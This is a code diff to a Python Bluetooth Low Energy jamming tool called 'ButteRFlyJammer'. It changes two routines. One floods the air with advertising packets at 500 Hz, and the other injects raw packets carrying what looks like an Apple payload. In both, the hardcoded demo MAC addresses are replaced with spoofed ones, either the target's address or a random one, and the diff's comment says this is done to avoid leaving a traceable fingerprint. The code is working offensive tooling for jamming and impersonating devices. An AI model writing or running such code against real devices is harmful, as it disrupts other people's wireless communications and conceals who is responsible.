@@ -253,9 +253,11 @@ class ButteRFlyJammer:
             try:
                 self._connector.stop()
             except Exception: pass
+            # Use a randomized LE address as the spoofed source — both better
+            # jamming hygiene (no static fingerprint) and avoids hardcoded demo MACs.
+            rand_mac = ":".join(f"{b:02x}" for b in os.urandom(6))
             adv_pkt = (BTLE() / BTLE_ADV() /
-                       BTLE_ADV_NONCONN_IND(AdvA="DE:AD:BE:EF:00:01",
-                                            data=adv_data))
+                       BTLE_ADV_NONCONN_IND(AdvA=rand_mac, data=adv_data))
             return self.start_raw_inject_flood(adv_pkt, channel=37, rate_hz=500.0)
         except Exception as e:
             self.last_error = f"adv_flood: {type(e).__name__}: {e}"
@@ -498,8 +500,9 @@ class ButteRFlyJammer:
             adv_data = bytes([2, 0x01, 0x1a]) + bytes([len(msd)+1, 0xff]) + msd
             return self.start_adv_flood(adv_data=adv_data)
         elif mode == ButteRFlyMode.BLE_RAW_INJECT:
+            spoof_mac = target_addr or ":".join(f"{b:02x}" for b in os.urandom(6))
             pkt = build_adv_nonconn_ind(
-                mac_str=target_addr or "aa:bb:cc:dd:ee:ff",
+                mac_str=spoof_mac,
                 payload=b"\xff\x4c\x00\x07\x19\x01\x22\x20"
             )
             return self.start_raw_inject_flood(pkt, channel=channel)
